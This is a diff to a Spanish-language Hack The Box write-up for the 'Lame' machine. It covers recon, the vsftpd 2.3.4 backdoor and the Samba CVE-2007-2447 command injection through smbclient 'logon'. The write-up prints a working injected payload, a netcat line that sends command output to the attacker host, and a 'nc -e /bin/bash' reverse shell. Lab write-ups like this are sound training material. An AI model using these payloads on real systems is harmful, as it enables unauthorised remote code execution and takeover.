@@ -50,7 +50,7 @@ whichSystem.py 10.10.10.3
 -Usar el comando *ping*: 
 
 ```bash
-ping 10.10.10.3 -1 -R
+ping 10.10.10.3 -c1 -R
 ```
 *-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, al ser Windows no lo muestra.*
 
@@ -106,7 +106,11 @@ En el escaneo de nmap vemos que nos ha sacado que hay un login. con <span style=
 ![](/assets/images/htb-writeup-lame/loganon_lame.png)
 
 
-Con **locate** ftp | **grep** <span style="color:orange">".nse"</span>  vemos el script que se ha usado.
+Ahora listaremos los scripts que se han usado en el puerto 21.
+
+```bash
+locate ftp | grep ".nse"
+```
 
 **ftp**-<span style="color:red">anon.nse</span>
 
@@ -115,21 +119,31 @@ Con **locate** ftp | **grep** <span style="color:orange">".nse"</span>  vemos el
 
 Vamos a mirar si hay algún contenido en el FTP entonces:
 
-**ftp** <span style="color:red">10.10.10.3</span> -> <span style="color:blue">anonymous</span>: <span style="color:darkred">(pass_en_blanco)</span>
+```bash
+ftp 10.10.10.3 
+-> Name anonymous
+-> Password (pass_en_blanco)
+```
 
 No habrá nada, archivos ni directorios.
 
 ![](/assets/images/htb-writeup-lame/logina_lame.png)
 
 
-##### :)
+### VULNERAVILIDAD V2.3.3: :)
 
-*searchsploit* **vsftpd 2.3.4**
+```bash
+searchsploit vsftpd 2.3.4
+```
 
 ![](/assets/images/htb-writeup-lame/searchespftp_lame.png)
 
 
-Miramos el código con el parámetro <span style="color:green">-x</span> /unix/remote/49757.py | batcat -l python
+Miramos el código del exploit: 
+
+```bash
+searchsploit -x /unix/remote/49757.py | batcat -l python
+```
 
 ![](/assets/images/htb-writeup-lame/viscript_lame.png)
 
@@ -144,7 +158,20 @@ Esta vulnerabilidad es más fácil que el anterior método, ya que en la versió
 
 Esto es debido porque alguien entro a los repositorios oficiales y modifico el código fuente para que si colocas en el login un **:)** este se enlace a una sh con privilegios (<span style="color:blue">root</span>).
 
+```bash
+ftp 10.10.10.3
+-> Name root:) 
+-> Passowrd (contraseña_en_blanco)
+```
+
 ![](/assets/images/htb-writeup-lame/logvul_lame.png)
+
+
+```bash
+nc 10.10.10.3 21
+-> USER root:)
+-> PASS (contraseña_en_blanco)
+```
 
 ![](/assets/images/htb-writeup-lame/onw_lame.png)
 
@@ -152,11 +179,11 @@ Esto es debido porque alguien entro a los repositorios oficiales y modifico el c
 Esto no es por aquí, es un **rabbit hole**.
 
 
-#### ANÁLISIS SMB: RECONOCIMIENTO
+### ANÁLISIS SMB: RECONOCIMIENTO
 
 ![](/assets/images/htb-writeup-lame/recsamv_lame.png)
 
-
+### RESOLUCIÓN NOMBRES LOCAL
 Agregamos en <span style="color:lightblue">/etc/</span><span style="color:grey">hosts</span> el **nombre del ordenador(loca)**, **FQDN** y **Dominio**. Para evitar problemas y así tener más compatibilidad en cuanto a usar el dominio en vez de la IP.
 
 ![](/assets/images/htb-writeup-lame/hosts_lame.png)
@@ -167,37 +194,61 @@ Por otro lado...
 
 Nos quedaremos con el primer exploit cual es una ejecución de comandos.
 
+```bash
+searchsploit samba 3.0.2
+```
+
 ![](/assets/images/htb-writeup-lame/searsmb_lame.png)
 
+### ANÁLISIS CÓDIGO
+Miramos el código del exploit:
 
-Miramos el código con el parámetro <span style="color:green">-x</span> /unix/remote/16320.rb | batcat -l ruby
+```bash
+searchsploit -x /unix/remote/16320.rb | batcat -l ruby
+```
 
 ![](/assets/images/htb-writeup-lame/visscript_lame.png)
 
 
 Nos dice que cuando nos conectemos a un share mediante el campo nombre podemos inyectar un código malicioso cual nos va a permitir ejecución de comandos.
 
-"/= `nohup comando`"
+```"/= `nohup comando`"```
 
 ![](/assets/images/htb-writeup-lame/howorksm_lame.png)
 
 
 Con *netexec* podremos solicitar info del sistema y listar shares con <span style="color:blue">null sesión</span>.
 
+```bash
+# Listamos información del sistema como NULL Session.
+netexec smb hackthebox.gr -u "" -p ""
+
+# Listamos shares como NULL Session.
+netexec smb hackthebox.gr -u "" -p "" --shares
+```
+
 ![](/assets/images/htb-writeup-lame/listshares_lame.png)
 
 
 Entraremos al <span style="color:lightblue">share tmp</span> ya que es al único que nos deja como <span style="color:blue">null sesión</span>.
 
+```bash
+smbclient \\\\10.10.10.3\\tmp
+-> Name (Nombre_en_blanco)
+-> Password (Contraseña_en_blanco)
+```
+
 ![](/assets/images/htb-writeup-lame/accshare_lame.png)
 
 
-#### USERNAME MAP SCRIPT: RCE
+### USERNAME MAP SCRIPT: RCE
 
 >Información acerca **CVE-2007-2447**:
 > [Incibe CVE-2007-2447](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2007-2447)
 
 Dentro con **?** listamos los comandos.
+
+``?``
 
 ![](/assets/images/htb-writeup-lame/listcomandosmb_lame.png)
 
@@ -205,12 +256,13 @@ Dentro con **?** listamos los comandos.
 Como estamos sin un usuario autenticado usaremos **logon** para usar el payload malicioso.
 En el campo username pondremos:
 
->"/= `nohup comando`"
+>```"/= `nohup comando`"```
 
 ![](/assets/images/htb-writeup-lame/logon_lame.png)
 
-Sintaxis para comprobar que funciona:
-**logon**  "/= `nohup ping 10.10.16.10 -c1`"
+Sintaxis para comprobar que funciona mediante una traza ICMP hacia nosotros desde la máquina victima:
+
+```logon  "/= `nohup ping 10.10.16.10 -c1`"```
 
 Nos enviaremos un **ping** a nuestra máquina.
 
@@ -219,17 +271,25 @@ Nos enviaremos un **ping** a nuestra máquina.
 
 Con *tcpdump* nos pondremos escucha para comprobar que recibimos la traza ICMP, y efectivamente la recibimos.
 
+```bash
+sudo tcpdump -l -i tun0 icmp
+```
+
 ![](/assets/images/htb-writeup-lame/recping_lame.png)
 
 
 Nos ponemos en escucha por el <span style="color:purple">puerto 444</span> para cuando establezcamos la *reverse shell*, recibir la conexión a nuestro host, de momento para ver la salida de algunos comandos.
+
+```bash
+nc -nvlp 444
+```
 
 ![](/assets/images/htb-writeup-lame/confnc_lame.png)
 
 
 Enviaremos un **whoami** para saber quien esta ejecutando los comandos.
 
-**logon**  "/= `nohup whoami | nc 10.10.16.10 444`"
+```logon  "/= `nohup whoami | nc 10.10.16.10 444`"```
 
 ![](/assets/images/htb-writeup-lame/envcom_lame.png)
 
@@ -239,45 +299,57 @@ Recibimos a nuestro **netcat** orden del comando, estamos ejecutando comandos co
 ![](/assets/images/htb-writeup-lame/roo_lame.png)
 
 
-##### REVERSE SHELL
+### REVERSE SHELL
 
 Ahora si preparamos netcat para revershell:
+
+```bash
+nc -nvlp 444
+```
 
 ![](/assets/images/htb-writeup-lame/confnc_lame.png)
 
 
-**logon**  "/= `nohup nc -e /bin/bash 10.10.16.10 444`"
+```logon  "/= `nohup nc -e /bin/bash 10.10.16.10 444`"```
 
 ![](/assets/images/htb-writeup-lame/confrv_lame.png)
 
 Por el otro lado recibiremos la conexión a nuestro nc en escucha.
 
+```bash
+# Comprobar nuestro usuario actual.
+id
+
+# Comprobar los párametros de red de la máquina actual.
+ip a
+```
+
 ![](/assets/images/htb-writeup-lame/recrv_lame.png)
 
 
-#### SHELL INTERACTIVA: TRATAMIENTO TTY
+### SHELL INTERACTIVA: TRATAMIENTO TTY
 
-1) **script** /dev/null -c bash
+1) ```script /dev/null -c bash```
 
 ![](/assets/images/htb-writeup-lame/tty1_lame.png)
 
 
-2) **CTRL** <span style="color:orange">+</span> **Z** para suspender netcat a segundo plano. (lo hago con otro puerto)
+2) ```CTRL + Z```
 
 ![](/assets/images/htb-writeup-lame/tty2_lame.png)
 
 
-3) **stty** <span style="color:yellow">raw</span> <span style="color:green">-echo</span><span style="color:orange">;</span> <span style="color:yellow">fg</span>
+3) ```stty raw -echo; fg```
 
 ![](/assets/images/htb-writeup-lame/tty3_lame.png)
 
 
-4) **reset  xterm** (no esta bien la imagen)
+4) ```reset  xterm``` (no esta bien la imagen)
 
 ![](/assets/images/htb-writeup-lame/tty3_lame.png)
 
 
-5) **export TERM**<span style="color:yellow">=xterm</span>
+5) ```export TERM=xterm```
 
 ![](/assets/images/htb-writeup-lame/tty5_lame.png)
 
@@ -287,14 +359,14 @@ Ya tendremos una  Shell totalmente interactiva !!
 ![](/assets/images/htb-writeup-lame/shell_interactiva.png)
 
 
-#### BANDERA USUARIO
+### BANDERA USUARIO
 
 Nos vamos al home del usuario <span style="color:blue">makis </span>-> <span style="color:lightblue">makis/</span> y cogemos la bandera.
 
 ![](/assets/images/htb-writeup-lame/flaguser_lame.png)
 
 
-#### BANDERA ROOT
+### BANDERA ROOT
 
 Nos vamos al directorio <span style="color:blue">root </span>-> <span style="color:lightblue">root/</span> y cogemos la bandera.
 
